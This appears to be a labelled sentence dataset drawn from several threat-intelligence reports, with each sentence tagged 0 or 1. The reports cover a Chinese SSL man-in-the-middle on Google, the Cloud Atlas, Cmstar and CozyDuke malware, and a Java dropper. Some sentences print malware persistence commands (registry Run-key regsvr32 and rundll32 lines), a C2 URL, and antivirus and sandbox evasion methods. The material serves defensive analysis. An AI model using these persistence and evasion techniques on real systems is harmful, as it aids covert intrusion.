On an interesting note , the registration address 7946 N Bridle Creek Way is the same observed within a civil suit between the National Football League and various Chinese domain resellers originally filed in May 2014 .	0
In early July 2015 , Chinese APT actors would operationalize an Adobe Flash Player exploit within 72 hours of its public disclosure , strategically staging it within a specific webpage detailing a noteworthy international legal case between the Philippines and China .	0
This precedent setting legal case would be followed by many Southeast Asian nations , as well as those around the globe .	0
The exploit appeared during the first round of hearings , exposing an untold number of interested parties that visited the webpage .	0
The tactic of leveraging strategic website compromises with patched or unpatched exploits is a well known observable which has been used consistently by various APT groups in recent years .	0
When considered holistically , the intelligence supports the conclusion that this exploitation campaign was purposefully carried out against the backdrop of diplomatic and legal maneuvering .	0
Manila has long recognized they are unable to independently lock horns with China diplomatically or militarily , by invoking dispute settlement procedures under the UNCLOS , an agreement in which both China and the Philippines are signatories .	0
The Philippines is seeking to leverage international law to level the playing field against China 's regional diplomatic and military dominance , the ultimate goal being to deter aggressive Chinese expansion activities within the Philippine EEZ and the broader South China Sea .	0
Despite Beijing 's unwillingness to participate in the international arbitration and their rejection of the PCA 's jurisdiction , there appears to be a distinct effort to surreptitiously monitor those who are interested in this landmark international legal case via electronic means .	0
This vignette also highlights the critical difference between threat data and threat intelligence .	0
The latter goes beyond simply pulling in a stream of open source indicators and blindly pushing them to your enterprise network security devices and SIEM tools hoping something hits ( it works great ; you 'll get TONS of hits … or misses , depending on your perspective ) .	0
A true Threat Intelligence Platform enables tactical , operational , and strategic analysis of the details behind the technical how within the context of the non- technical , socio - political why .	0
ThreatConnect has previously shared Threat Intelligence research of espionage activity tied to the increasing tensions within the South China Sea .	0
In a similar fashion , ThreatConnect has shared additional details of this incident to our Common Community within Incident 20150710D : Permanent Court of Arbitration Flash Exploit .	0
Log into your ThreatConnect account or register for one via our Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform on the market .	0
Thursday , 04 September 2014 23:55:00 ( UTC / GMT ) The Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and Google .	1
We 've performed technical analysis of the attack , on request from GreatFire.org , and can confirm that it is a real SSL MITM against www.google.com and that it is being performed from within China .	0
We were contacted by GreatFire.org yesterday ( September 3 ) with a request to analyze two packet captures from suspected MITM - attacks before they finalized their blog post .	0
The conclusions from our analysis is now published as part of GreatFire.org 's great blog post titled " Authorities launch man - in - the- middle attack on Google " .	0
In their blog post GreatFire.org write .	0
From August 28 , 2014 reports appeared on Weibo and Google Plus that users in China trying to access google.com and google.com.hk via CERNET , the country 's education network , were receiving warning messages about invalid SSL certificates .	0
The evidence , which we include later in this post , indicates that this was caused by a man - in - the - middle attack .	0
While the authorities have been blocking access to most things Google since June 4th , they have kept their hands off of CERNET , China 's nationwide education and research network .	0
However , in the lead up to the new school year , the Chinese authorities launched a man - in - the - middle ( MITM ) attack against Google .	0
Our network forensic analysis was performed by investigating the following to packet capture files .	0
The analyzed capture files contain pure IPv6 traffic ( CERNET is a IPv6 network ) which made the analysis a bit different then usual .	0
We do not disclose the client IP addresses for privacy reasons , but they both seem legit ; one from Peking University ( netname PKU6-CERNET2 ) and the other from Chongqing University ( CQU6-CERNET2 ) .	0
Both IP addresses belong to AS23910 , named " China Next Generation Internet CERNET2 " .	0
The IP addresses received for www.google.com were in both cases also legit , so the MITM was n't carried out through DNS spoofing .	0
The Peking University client connected to 2607:f8b0:4007:804::1013 ( GOOGLE - IPV6 in United States ) and the connection from Chongqing University went to 2404:6800:4005:805::1010 ( GOOGLE_IPV6_AP-20080930 in Australia ) .	0
The Time - To - Live ( TTL ) values received in the IP packets from www.google.com were in both cases 248 or 249 ( note : TTL is actually called " Hop Limit " in IPv6 nomenclature , but we prefer to use the well established term " TTL " anyway ) .	0
The highest possible TTL value is 255 , this means that the received packets haven't made more than 6 or 7 router hops before ending up at the client .	0
However , the expected number of router hops between a server on GOOGLE - IPV6 and the client at Peking University is around 14 .	0
The low number of router hops is is a clear indication of an IP MITM taking place .	0
Here is an IPv6 traceroute from AS25795 in Los Angeles towards the IP address at Peking University ( generated with ARP Networks ' 4or6.com tool ) .	0
# traceroute -6 2001:da8:[REDACTED ] 1 2607:f2f8:1600::1 ( 2607:f2f8:1600::1 ) 1.636 ms 1.573 ms 1.557 ms 2 2001:504:13::1a ( 2001:504:13::1a ) 40.381 ms 40.481 ms 40.565 ms 3 * * * 4 2001:252:0:302::1 ( 2001:252:0:302::1 ) 148.409 ms 148.501 ms 148.595 ms 5 * * * 6 2001:252:0:1::1 ( 2001:252:0:1::1 ) 148.273 ms 147.620 ms 147.596 ms 7 pku-bj-v6.cernet2.net ( 2001:da8:1:1b::2 ) 147.574 ms 147.619 ms 147.420 ms 8 2001:da8:1:50d::2 ( 2001:da8:1:50d::2 ) 148.582 ms 148.670 ms 148.979 ms 9 cernet2.net ( 2001:da8:ac : ffff::2 ) 147.963 ms 147.956 ms 147.988 ms 10 2001:da8:[REDACTED ] 147.964 ms 148.035 ms 147.895 ms 11 2001:da8:[REDACTED ] 147.832 ms 147.881 ms 147.836 ms 12 2001:da8:[REDACTED ] 147.809 ms 147.707 ms 147.899 ms As can be seen in the traceroute above , seven hops before the client we find the 2001:252::/32 network , which is called " CNGI International Gateway Network ( CNGIIGN ) " .	0
This network is actually part of CERNET , but on AS23911 , which is the network that connects CERNET with its external peers .	0
A reasonable assumption is therefore that the MITM is carried out on the 2001:252::/32 network , or where AS23910 ( 2001:da8:1::2 ) connects to AS23911 ( 2001:252:0:1::1 ) .	1
This means that the MITM attack is being conducted from within China .	0
The round - trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server .	0
The expected round - trip time for connecting from CERNET to a Google server overseas would be around 150ms or more .	0
However , in the captures we 've analyzed the TCP SYN+ACK package was received in just 8ms ( Peking ) and 52ms ( Chongqing ) respectively .	0
Again , this is a clear indication of an IP MITM taking place , since Google can not possibly send a response from the US to CERNET within 8ms regardless of how fast they are .	1
The fast response times also indicate that the machine performing the MITM is located fairly close to the network at Peking University .	0
Even though the machine performing the MITM was very quick at performing the TCP tree - way handshake we noticed that the application layer communication was terribly slow .	0
The specification for the TLS handshake ( RFC 2246 ) defines that a ClientHello message should be responded to with a ServerHello .	0
Google typically send their ServerHello response almost instantly , i.e.	0
the response is received after one round - trip time ( 150ms in this case ) .	0
However , in the analyzed captures we noticed ServerHello response times of around 500ms .	0
We extracted the X.509 certificates from the two capture files to .cer files using NetworkMiner .	0
We noticed that both users received identical certificates , which were both self signed for " google.com " .	0
The fact that the MITM used a self signed certificate makes the attack easily detectable even for the non- technical user , since the web browser will typically display a warning about the site not being trusted .	0
Additionally the X.509 certificate was created for " google.com " rather than " * .google.com " .	0
This is an obvious miss from the MITM'ers side since they were attempting to MITM traffic to " www.google.com " but not to " google.com " .	0
Certificate SHA1 fingerprint : f6beadb9bc02e0a152d71c318739cdecfc1c085d Certificate MD5 fingerprint : 66:D5:D5:6A : E9:28:51:7C:03:53:C5:E1:33:14:A8:3B A copy of the fake certificate is available on Google drive thanks to GreatFire.org .	0
All evidence indicates that a MITM attack is being conducted against traffic between China 's nationwide education and research network CERNET and www.google.com .	1
It looks as if the MITM is carried out on a network belonging to AS23911 , which is the outer part of CERNET that peers with all external networks .	0
This network is located in China , so we can conclude that the MITM was being done within the country .	0
It 's difficult to say exactly how the MITM attack was carried out , but we can dismiss DNS spoofing as the used method .	0
The evidence we 've observed instead indicate that the MITM attack is performed either by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy .	1
An alternative to changing the router config would also be to add an in - line device that redirects the desired traffic to the SSL proxy .	0
However , regardless of how they did it the attacker would be able to decrypt and inspect the traffic going to Google .	0
We can also conclude that the method used to perform the MITM attack was similar to the Chinese MITM on GitHub , but not identical .	0
Share | Short URL : http://netresec.com/?b=14955CB Posted by Erik Hjelmvik on Thursday , 04 September 2014 23:55:00 ( UTC / GMT )	0
Two years ago , we published our research into RedOctober , a complex cyber-espionage operation targeting diplomatic embassies worldwide .	0
We named it RedOctober because we started this investigation in October 2012 , an unusually hot month .	0
After our announcement in January 2013 , the RedOctober operation was promptly shut down and the network of C & Cs was dismantled .	0
As usually happens with these big operations , considering the huge investment and number of resources behind it , they do n't just '' go away '' forever .	0
Normally , the group goes underground for a few months , redesigns the tools and the malware and resume operations .	0
See : Since January 2013 , we 've been on the lookout for a possible RedOctober comeback .	0
One possible hit was triggered when we observed Mevade , an unusual piece of malware that appeared late in 2013 .	0
The Mevade C & C name styles as well as some other technical similarities indicated a connection to RedOctober , but the link was weak .	0
It was n't until August 2014 that we observed something which made us wonder if RedOctober is back for good .	0
In August 2014 , some of our users observed targeted attacks with a variation of CVE-2012-0158 and an unusual set of malware .	0
We did a quick analysis of the malware and it immediately stood out because of certain unusual things that are not very common in the APT world .	0
Some of the filenames used in the attacks included : At least one of them immediately reminded us of RedOctober , which used a very similarly named spearphish : '' Diplomatic Car for Sale.doc '' .	1
As we started digging into the operation , more details emerged which supported this theory .	0
Perhaps the most unusual fact was that the Microsoft Office exploit did n't directly write a Windows PE backdoor on disk .	0
Instead , it writes an encrypted Visual Basic Script and runs it .	1
This VBScript drops a pair of files on disk - a loader and an encrypted payload .	1
The loader appears to be different every time and internal strings indicate it is '' polymorphically '' generated .	0
The payload is always encrypted with a unique key , making it impossible to decrypt unless the DLL is available .	1
We observed several different spear-phishing documents that drop uniquely named payloads .	1
For instance , the '' qPd0aKJu.vbs '' file MD5 : E211C2BAD9A83A6A4247EC3959E2A730 drops the following files : The VBS also adds a registry key : HKEYCURRENTUSER\Software\Microsoft\Windows\CurrentVersion\Run\ setting the key '' bookstore '' to the value '' regsvr32 % path % \ctfmonrn.dll /s '' , which ensures the malware runs every time at system boot .	1
Some of the DLL names we observed include : Some of the payload names include : The payload includes an encrypted configuration block which contains information about the C & C sever : The information from the config includes a WebDAV URL which is used for connections , a username and password , two folders on the WebDAV server used to store plugins/modules for the malware and where data from the victim should be uploaded .	1
The Cloud Atlas implants utilize a rather unusual C & C mechanism .	1
All the malware samples we 've seen communicate via HTTPS and WebDav with the same server '' cloudme.com '' , a cloud services provider .	1
According to their website , CloudMe is owned and operated by CloudMe AB , a company based in Linköping , Sweden .	0
( Important note : we do not believe that CloudMe is in any way related to the Cloud Atlas group - the attackers simply create free accounts on this provider and abuse them for command-and-control ) .	0
Each malware set we have observed so far communicates with a different CloudMe account though .	1
The attackers upload data to the account , which is downloaded by the implant , decrypted and interpreted .	1
In turn , the malware uploads the replies back to the server via the same mechanism .	1
Of course , it should be possible to reconfigure the malware to use any Cloud-based storage service that supports WebDAV .	0
Here 's a look at one such account from CloudMe : The data from the account : The files stored in the randomly named folder were uploaded by the malware and contain various things , such as system information , running processes and current username .	1
The data is compressed with LZMA and encrypted with AES , however , the keys are stored in the malware body which makes it possible to decrypt the information from the C & C .	1
We previously observed only one other group using a similar method – ItaDuke – that connected to accounts on the cloud provider mydrive.ch .	1
Just like with RedOctober , the top target of Cloud Atlas is Russia , followed closely by Kazakhstan , according to data from the Kaspersky Security Network ( KSN ) .	0
Actually , we see an obvious overlap of targets between the two , with subtle differences which closely account for the geopolitical changes in the region that happened during the last two years .	0
Interestingly , some of the spear-phishing documents between Cloud Atlas and RedOctober seem to exploit the same theme and were used to target the same entity at different times .	1
Both Cloud Atlas and RedOctober malware implants rely on a similar construct , with a loader and the final payload that is stored encrypted and compressed in an external file .	0
There are some important differences though , especially in the encryption algorithms used – RC4 in RedOctober vs AES in Cloud Atlas .	0
The usage of the compression algorithms in Cloud Altas and RedOctober is another interesting similarity .	0
Both malicious programs share the code for LZMA compression algorithm .	0
In CloudAtlas it is used to compress the logs and to decompress the decrypted payload from the C & C servers , while in Red October the '' scheduler '' plugin uses it to decompress executable payloads from the C & C .	0
It turns out that the implementation of the algorithm is identical in both malicious modules , however the way it is invoked is a bit different , with additional input sanity checks added to the CloudAtlas version .	0
Another interesting similarity between the malware families is the configuration of the build system used to compile the binaries .	0
Every binary created using the Microsoft Visual Studio toolchain has a special header that contains information about the number of input object files and version information of the compilers used to create them , the '' Rich '' header called so by the magic string that is used to identify it in the file .	0
We have been able to identify several RedOctober binaries that have '' Rich '' headers describing exactly the same layout of VC 2010 + VC 2008 object files .	0
Although this does n't necessarily mean that the binaries were created on the same development computer , they were definitely compiled using the same version of the Microsoft Visual Studio up to the build number version and using similar project configuration .	0
To summarize the similarities between the two : Finally , perhaps the strongest connection comes from targeting .	0
Based on observations from KSN , some of the victims of RedOctober are also being targeted by CloudAtlas .	1
In at least one case , the victim 's computer was attacked only twice in the last two years , with only two malicious programs – RedOctober and Cloud Atlas .	0
These and other details make us believe that CloudAtlas represents a rebirth of the RedOctober attacks .	0
Following big announcements and public exposures of targeted attack operations , APT groups behave in a predictable manner .	0
Most Chinese-speaking attackers simply relocate C & C servers to a different place , recompile the malware and carry on as if nothing happened .	1
Other groups that are more nervous about exposure go in a hibernation mode for months or years .	0
Some may never return using the same tools and techniques .	0
However , when a major cyber-espionage operation is exposed , the attackers are unlikely to completely shut down everything .	0
They simply go offline for some time , completely reshuffle their tools and return with rejuvenated forces .	0
We believe this is also the case of RedOctober , which makes a classy return with Cloud Atlas .	0
In recent weeks , Unit 42 has been analyzing delivery documents used in spear - phishing attacks that drop a custom downloader used in cyber espionage attacks .	1
This specific downloader , Cmstar , is associated with the Lurid downloader also known as ' Enfal ' .	0
Cmstar was named for the log message ' CM * * ' used by the downloader .	0
Unit 42 is aware of threat actors using two toolkits – MNKit and the Tran Duy Linh toolkit – to produce malicious documents that exploit CVE-2012 - 0158 in order to implant Cmstar .	0
The Cmstar downloader itself has several unique and interesting features , as well as substantial infrastructure overlap with other tools worth discussing .	0
The Cmstar downloader starts by manually building its import address table ( IAT ) , much like shellcode would ; however , it uses a rather unique technique .	0
Instead of finding API function names based on their hashed values , this malware enumerates libraries ' export address table ( EAT ) and searches for the name of the API function the payload needs to load by using a character to offset array .	1
The payload pairs several comma - separated lists of characters with comma - separated lists of numbers .	0
Each list of characters consists of the set found within the API function name the payload seeks to add to its IAT , while the corresponding list of numbers specifies the offset in the function name where those characters should be placed .	0
For example , if the payload has " D , e , A " paired with " 0,5,19 " , this results in the following mapping .	0
The payload loads a specific Windows library 's EAT by calling the ImageDirectoryEntryToData API function using the IMAGE_DIRECTORY_ENTRY_EXPORT flag .	0
It then enumerates the library 's EAT to find exported function names by checking each function name for the character and the specific offset .	0
Once found , the payload adds the address for the specific API function to its IAT .	0
For instance , the payload checks the EAT of " wininet.dll " using the comparisons mentioned above to find the address to the " DeleteUrlCacheEntryA " API function .	0
One specific Cmstar payload that we analyzed used the character / offsets seen in Figure 1 to locate the API functions within three different Windows libraries to build its IAT .	0
After manually creating the IAT , Cmstar decrypts its configuration , several encrypted strings , and a piece of shellcode .	0
The embedded configuration contains nothing more than a URL that Cmstar uses as its command and control ( C2 ) location .	1
The encrypted strings within the Trojan include fields used within the HTTP requests that Cmstar will create to communicate with its C2 server , as well as additional strings used to interact with the registry .	1
The Cmstar sample associated with the MNKIT delivery document creates the following registry key to automatically execute at system startup .	1
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xpsfiltsvcs : " rundll32.exe C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\xpsfiltsvcs.dll , XpsRegisterServer " Unit 42 found an additional encrypted registry key that would allow Cmstar to automatically start up after reboots .	0
However , the code does not decrypt , reference , or use the following registry key in any way , which suggests that the malware author left this artifact in the code after swapping to the run key listed above .	0
HKCU\Software\Microsoft\CTF\LangBarAddIn Cmstar also decrypts a 752-byte piece of shellcode that carries out communications with the C2 server , specifically by sending HTTP POST requests to the following URL .	1
http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi It should be noted that the C2 URL contains the string ' cgl - bin ' , which visually resembles the common cgi- bin folder used by many webservers to run server - side scripts .	0
Unit 42 used the Palo Alto Networks AutoFocus threat intelligence service to locate additional samples using the ' cgl - bin ' string within URLs of HTTP requests and found several samples of the Cmwhite tool associated with the LURID / Enfal downloader1 , as seen in Figure 2 .	0
Cmstar 's HTTP POST requests sent to ' happy.launchtrue[.]com ' contain data that the Trojan gathers from the infected machine that has the following structure .	1
< Windows Version number>@@<CPU Architecture ( 2 for x64 , 1 for x86)>??<boolean for elevated privileges>]]**<boolean if antivirus processes are found>!!<static version string>== In one example , Unit 42 observed the following data within an analysis environment , which was then encrypted using a single - byte XOR algorithm and a key of 0x45 before being sent to the C2 server .	0
510@@1??1]]**0!!150316o== Helpfully , the malware author writes log messages to the ' DF64159.TMP ' file , used for debugging purposes throughout the execution of the Cmstar downloader .	1
The log messages are abbreviated strings that describe specific activities during the execution of the code .	0
For instance , the downloader uses the CreateMutex to create a mutex named ' { 53A4988C - F91F-4054 - 9076 - 220AC5EC03F3 } ' to determine if another instance of the code is running .	0
If the downloader determines another instance of itself is running , the code writes the string ' CM * * ' – which happens to be the basis for the name of the Trojan – to the log file .	0
Unit 42 created a Yara signature to detect Cmstar samples based on these debugging strings , which is available in the appendix .	0
As mentioned in the behavioral analysis section , the Cmstar downloader gathers system - specific information to send to the C2 server .	1
One such piece of information is the existence of specific running processes .	0
Many malware families and tools check for the existence of antivirus , but the Cmstar tool does so in a clever way .	0
Rather than including a list of strings of associated processes , Cmstar enumerates the running processes and subjects these process names to a hashing algorithm .	0
The results of this algorithm are then compared against three static values : 0x1E00AFA , 0xBEE091E8 and 0xD46FCDFA .	0
Unit 42 reverse engineered the algorithm and created the function seen below to generate hashes in order to determine the processes Cmstar is trying to find .	0
Unit 42 found that the string ' avp ' subjected to the algorithm above results in the value 0x1E00AFA , which suggests the Cmstar sample specifically looks for Kaspersky 's Anti - virus product ( avp.exe ) running on the compromised system .	1
If the Trojan finds processes whose hash matches the three values mentioned earlier , it sets a boolean value ( the character ' 1 ' ) within the data sent to the C2 server and continues carrying out its functionality .	0
Rather than altering its activities , Cmstar only notifies the C2 server if a system is running one of these processes , suggesting that the threat actors might employ this technique as a filtering mechanism to ignore analysis systems and researchers .	0
In order to determine the intrusion set involved with the Cmstar , Unit 42 enumerated infrastructure used by the downloader for its C2 servers .	0
The related infrastructure chart in Figure 3 shows a rather large cluster of related entities with one small set of entities that do not share any related entities with the larger cluster .	0
As seen in the chart above , the C2 domain ' happy.launchtrue[.]com ' was originally registered using the email address ' WANGMINGHUA6@GMAIL[.]COM ' .	0
When Unit 42 used the Palo Alto Networks AutoFocus threat intelligence service to locate additional Cmstar samples , we found several with C2 domains that also had the same original registrant .	0
The only known Cmstar C2 domain not initially registered by the email address was help.ubxpi0s[.]com .	0
Further analysis revealed that additional domains related to Cmstar C2 domains were also originally registered using the email address ' WANGMINGHUA6@GMAIL[.]COM ' and updated to the current information within a few days .	0
In addition , this was the original registrant for C2 domain used in our Google Code blog2 , indicating this registrant email is likely a re - seller , and/or someone who initially sets up infrastructure for particular APT threat actors .	0
The rest of the domains related to the Cmstar infrastructure did not use the original registrant noted above , but instead kept the same information initially used to register them .	0
The difference in domain registration patterns could indicate threat actor preference , or could indicate there are at least two groups using this malware whose infrastructure at times overlaps .	0
Interestingly , the updated registrant information ( or original , in the cases where it was n't changed ) for all of the C2 domains in this blog has also been used to register scam sites , most purporting to sell knock - off designer products like shoes , software , or cell phones .	0
The contact emails and contact names can vary , but the address is re - used .	0
Blue Coat noted this pattern as well in a blog published late last year , which also noted the ' WANGMINGHUA6@GMAIL[.]COM ' registrant email.3 It is not known whether the threat actors conducting the malicious activity are also behind the scam sites .	0
The Cmstar tool has several interesting features , including a previously unseen method of manually creating its import address table using an API function name character to offset mapping techniques , and a hashing algorithm used to find antivirus processes on an infected system .	1
Both of these features are noteworthy and may provide the ability to correlate future tools to the same group and/or malware authors .	0
The URL used by Cmstar to communicate with its C2 server , as well as significant infrastructure overlap , show a direct relationship between the Cmstar downloader , Lurid / Enfal and Cmwhite tools .	0
In a majority of the cases , threat actors using the Cmstar downloader initially register the C2 domains using the email address ' WANGMINGHUA6@GMAIL[.]COM ' and later change the registration information to include a different email address .	0
Unit 42 can not positively confirm that the threat actors control the ' WANGMINGHUA6@GMAIL[.]COM ' email address , or if the email address belongs to a reseller that the threat actors buy domains from to create their infrastructure ; however , we do believe this is an interesting TTP worth tracking in future infrastructure enumeration .	0
Known Cmstar Downloaders Delivery Documents Installing Cmstar	0
It 's friday afternoon , I had a bit of free time and stumbled across this tweet by PhysicalDrive0 ( thx ! ) two hours ago and thought to give it a try to finally add a new article to this Blog ( first of 2014 ) : So , I went to Google to search for the domain of the Embassy of Greece Beijing and added the ( allegedly ) malicious java file package that was found by PhysicalDrive0 : Next , I loaded the 1.jar file into Java Decompiler to get the source code .	0
It showed , that the functionality is obfuscated in some way , e.g .	0
the function csfn ( String paramString ) decrypts all strings by '' removing '' the numbers of the string parameter : There are some other obfuscation techniques , but they are not important here .	0
Instead , the following deobfuscated code line in the function init ( ) gives us an idea where the actual payload is located : We can also see , that the java package contains a file named pack , so we open 7-Zip and unpack the file .	0
A quick view with a PE viewer showed , that it is a x86 PE executable not even encrypted ( SHA256 : b832e4b5a4829c8df6de7b42c5cb32ef25b5ab59072b4c2a7838404cd0dd5e5f ) : So , I opened IDA Pro to take a quick look at the functionality .	0
Together with the strings of the executable , we get a brief idea of what the purpose of this malware is .	0
The important strings are as follows : Together with the output of IDA Pro , we can see that this malware uses the command line tool cmd.exe for adding several registry keys to Internet Explorer .	1
It also tries to retrieve possible AntiVirus information by using the COM interface ( dc12a687-737f-11cf-884d-00aa004b2e24 - > IWbemLocator - > SELECT * FROM AntiVirusProduct ) .	1
Furthermore , it makes use of the COM to launch an instance of Internet Explorer ( d30c1661-cdaf-11d0-8a3e-00c04fc9e26e - > IWebBrowser2 ) , supposedly to contact its C & C server .	1
To verify this , we open up Wireshark and run the executable .	0
As a result , we get the following network information : Also , we see that it downloads some kind of data ( Base64 encoded ) .	1
But first , we combine the C & C server and the HTTP request and open the URL in our favorite Browser : As you can see , there is a string named microsoft followed by Base64 encoded data .	0
Side note : Is there also a Linux equivalent ? Next , we copy the Base64 encoded data and go to the following website to let us decode it into a file ( because I had the feeling it 's just another unencrypted executable ) : As a result , we get another executable ( SHA256 : a4863f44f48d1c4c050dd7baad767a86b348dd4d33924acf4e0a3cd40c6ae29f ) that was only Base64 encoded and not encrypted in any way : So again , we fire up our PE viewer and take a look at the important strings : Again , we load the executable into IDA Pro and quickly fly over the assembly code to get an idea of the functionality .	0
Once again , it creates several registry entries with the help of the command line tool and creates an instance of the Internet Explorer ( CoCreateInstance ( ) - > d30c1661-cdaf-11d0-8a3e- 00c04fc9e26e ) for contacting the C & C server .	1
This time , the network information is as follows : From the code we can see , that the sample has also the ability to encode / decode data from / to Base64 .	1
The dynamic analysis showed the malware sample contacted the C & C server , but was n't sending any URL parameters ( id1 , id2 ) .	1
Also the server did n't respond ...	0
The files can be downloaded here : That 's it , have a nice weekend ...	0
TLP : WHITE This whitepaper provides an overview of CozyDuke , a set of tools used by one or more malicious actors for performing targeted attacks against high profile organizations , such as governmental organizations and other entities that work closely with these institutions .	0
The CozyDuke toolset , which we believe has been under active development since at least 2011 , consists of tools for infecting targeted hosts , establishing and maintaining backdoor access to the hosts , gathering information from them and gaining further access to other hosts inside the victim organization .	1
Based on command and control ( C&C ) server information found being used by CozyDuke tools , we believe the CozyDuke toolset is used by at least one malicious actor who also uses , or at the least shares , infrastructure with actors using the known threats , MiniDuke and OnionDuke .	0
F - SECURE LABS SECURITY RESPONSE Malware analysis Whitepaper CozyDuke , as referred to in this document , is a set of tools used by one or more malicious actors for performing targeted attacks against high profile organizations .	0
The core of the CozyDuke toolset is a modular attack platform consisting of a main component augmented by a set of additional modules implementing further functionality .	0
The CozyDuke toolset also includes multiple kinds of droppers for infecting hosts with CozyDuke or for executing additional tools from the CozyDuke toolset .	1
Finally , the CozyDuke toolset includes tools and scripts – some custom - written , others based on openly available tools – that are used for purposes such as gathering further information from infected hosts or for infecting additional hosts in the same target organization .	1
We have observed CozyDuke being spread via email , which usually contain a link to a compromised website hosting a ZIP file ( although in at least one case , the file was hosted on Dropbox ) .	1
These files contain an executable that , upon execution , will write to disk and execute CozyDuke , while at the same time presenting the user with a decoy to divert attention .	1
The decoy is usually an uninteresting PDF , but we have also observed a Flash video of monkeys being presented as the decoy .	0
We have reason to believe CozyDuke is being used to target governmental organizations and entities that work closely with such bodies .	0
We believe the current CozyDuke activity started at the end of January 2015 .	0
Most of the samples we have observed were compiled beginning from the end of January .	0
However , based on comparisons of recent CozyDuke samples against older samples we have obtained dating back as far as the end of 2011 , we believe CozyDuke has been under active development since at least 2011 .	0
We have strong evidence suggesting the group using CozyDuke is the same as - or at the least shares command and control infrastructure with - the group or groups using MiniDuke and OnionDuke .	0
Firstly , a CozyDuke sample from February of 2012 attempts to contact a C&C server at nostressjob.com .	0
This domain has previously been associated with known MiniDuke C&C infrastructure .	0
This same infrastructure has also been seen in use by OnionDuke .	0
Secondly , we also have reason to believe CozyDuke has , in some instances , downloaded and executed droppers for DLL files reminiscent of OnionDuke .	1
Specifically , the DLLs dropped have used file and export names also used by OnionDuke .	0
Additionally , the strings in the DLLs have been encrypted using the same algorithm used by OnionDuke .	0
This link is , however , not as conclusive as the infrastructure overlap .	0
Infection with CozyDuke begins with the victim receiving an email containing a link to a ZIP file .	0
This ZIP file will contain a single executable , usually a self - extracting RAR archive .	0
Upon execution , it will write two files to disk .	1
The first file is a decoy .	0
The decoy has usually been a PDF document but Flash videos have also been observed in some cases .	0
The second file extracted from the archive is a CozyDuke dropper .	0
This dropper will then proceed to write to disk the main CozyDuke components as well as an encrypted configuration file used by CozyDuke .	1
The main CozyDuke dropper , used for infecting hosts with CozyDuke , begins by checking whether the victim has an anti - virus product installed .	1
Should an installed product be found , it will be compared to a predetermined list of product names .	0
If the installed product matches a name on the list , the dropper will immediately exit .	0
Newer versions of the dropper will perform additional checks to ensure the dropper is not being executed inside a virtual machine or a known malware analysis sandbox environment .	1
Should either of these checks fail , the dropper will likewise exit immediately .	0
Next , the dropper will find and decrypt encrypted data stored as two PE resources embedded in the executable .	0
These resources are named with the hexadecimal identifiers 0x000A and 0x000B.	0
Both resources are structured similarily .	0
They begin with a four - byte value specifying the length of the included decryption key .	0
This decryption key immediately follows the length field .	0
Finally , the rest of the resource is the encrypted payload .	0
The encryption used is a simple XOR with a rotating key .	0
The first resource , 0x000A , contains as its payload a Microsoft cabinet archive .	0
This archive contains the CozyDuke components that the dropper will later install on the victim system .	0
The second resource , 0x000B , contains as its payload an XML file with instructions for the dropper on where to install the dropped components and what to name them .	0
The dropper will then proceed to write the CozyDuke components to the specified location .	1
The dropper will additionally copy the system file rundll32.exe to the install location for CozyDuke .	1
This file will also use a name specified in the droppers configuration file .	0
Finally , the dropper will use the copy of rundll32.exe to load and execute the CozyDuke main component .	1
The main component of CozyDuke is a DLL file responsible for orchestrating all of CozyDuke 's activity on a victim machine .	0
The main component is executed by the CozyDuke dropper using a copy of rundll32.exe .	1
The entrypoint function varies , but is always specified in the dropper configuration .	0
The most important functionalities offered by the main component are establishment of persistence , gathering of basic system information , communication with the C&C server and the execution of additional tasks , modules or executables as commanded by the C&C server .	1
CozyDuke may use multiple techniques for establishing persistence ; the following is one technique used .	0
Firstly , CozyDuke may set itself to be executed at system startup by adding a registry value under any of the following registry keys : The name of the registry value will usually be the filename , ( without the extension ) of the CozyDuke main component .	1
CozyDuke may also register itself as a Windows service or scheduled task .	1
Additionally , CozyDuke may utilize a technique known as COM - object hijacking [ 1 ] to establish persistence .	0
To achieve this , CozyDuke will " hijack " the registry entries for the COM object " SharedTaskScheduler " .	1
CozyDuke will modify the registry entries in such a way that any loading of the SharedTaskScheduler COM object will first load a special CozyDuke module that will ensure CozyDuke stays active on the victim host .	1
The configuration data for CozyDuke is stored as a separate RC4-encrypted file that is written to disk by the CozyDuke dropper during initial infection .	0
The name of the encrypted configuration file on disk has been racss .	0
dat in all of the observed cases .	0
The decrypted file is formatted as XML with the UTF-16LE character encoding .	0
In all CozyDuke samples from 2015 , the configuration data has been encrypted with the RC4 key B5 78 62 52 98 3E 24 D7 3B C6 EE 7C B9 ED 91 62 .	0
In CozyDuke samples from July of 2014 , the RC4 key has been embedded in the encrypted configuration file .	0
In this case , the encrypted configuration file will begin with a 4-byte value specifying the length of the included RC4 key .	0
This will be followed by the actual key .	0
Finally , the rest of the file will be the actual configuration data .	0
CozyDuke 's main method of communicating with its command and control server is using either HTTP or HTTPS .	1
The method of communication , as well as the address to connect to , are specified in CozyDuke 's configuration data .	0
In the cases we have observed , the configuration data for any single CozyDuke instance has included the details of either one or two C&C servers .	1
Listed above are details of known CozyDuke C&C servers .	0
We believe all of the ones listed are compromised servers .	0
In addition to its main communication method , CozyDuke also features the ability to use Twitter as a backup C&C channel .	0
In cases where CozyDuke utilizes this functionality , the twitter account to be used will be specified in CozyDuke 's configuration data .	0
We have only observed two samples where a backup Twitter account was actually specified in the configuration data .	0
These accounts were @US2515 and @monkey_drive .	0
Tasks CozyDuke 's primary purpose is the execution of tasks .	1
These tasks usually involve the execution of modules or executables providing additional functionality .	1
The main difference between the two is that modules are DLL files loaded in memory by the CozyDuke main component , whereas executables are PE executable files that CozyDuke will write to disk and execute .	0
For the purpose of managing tasks , the main component of CozyDuke implements 6 commands that the C&C server can specify .	1
These commands are briefly described in Table 2 ( overleaf ) .	0
The following chapter , CozyDuke Tasks , provides further information on the tasks CozyDuke has been observed executing .	0
Based on samples obtained from our own collections and generously shared to us by a trusted source , we have been able to identify some of the tasks executed recently by CozyDuke .	0
These tasks can be divided into two categories .	0
The first consists of CozyDuke modules which are DLL files loaded in memory by the main component of CozyDuke for the purposes of extending CozyDuke 's functionality .	1
The second category consists of PE executable files that CozyDuke will write to disk and execute on the infected host .	1
